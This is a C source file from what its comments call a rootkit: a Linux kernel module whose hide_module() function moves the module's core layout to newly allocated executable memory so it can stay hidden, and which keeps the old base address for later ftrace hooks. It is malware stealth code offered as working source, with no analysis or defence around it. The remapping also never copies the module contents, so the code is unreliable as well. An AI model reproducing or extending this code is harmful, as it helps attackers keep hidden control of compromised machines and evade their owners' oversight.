#include <linux/module.h>
#include <linux/vmalloc.h>

#include "module_hiding.h"

/*
 * New kernel module base addr
 * This will be necessary for ftrace hooks later on
 */
static void *module_base_addr = NULL;
static unsigned int module_size = 0;

int hide_module(void) {

    struct module_layout *core_layout;
    void *new_module_base;

    /*
     * Get the module information for its core layout and redirect the core
     * layout to a different memory location, such that the rootkit can
     * continue living within in the kernel
     */

    core_layout = &THIS_MODULE->core_layout;
    module_size = core_layout->size;
    module_base_addr = core_layout->base;

    /*
     * Allocate a new memory space for the new kernel module base layout
     */

    new_module_base = __vmalloc(module_size, GFP_KERNEL, PAGE_KERNEL_EXEC);
    if (!new_module_base) {
        // cannot allocate new memory
        return -1;
    }

    /*
     * Remap the base layout
     */
    core_layout->base = new_module_base;

    return 0;
}

int __within_module_core(unsigned long addr) {

    /* Check if addr is within the module */

    return module_base_addr && (unsigned long) module_base_addr <= addr &&
           addr < (unsigned long) module_base_addr + module_size;
}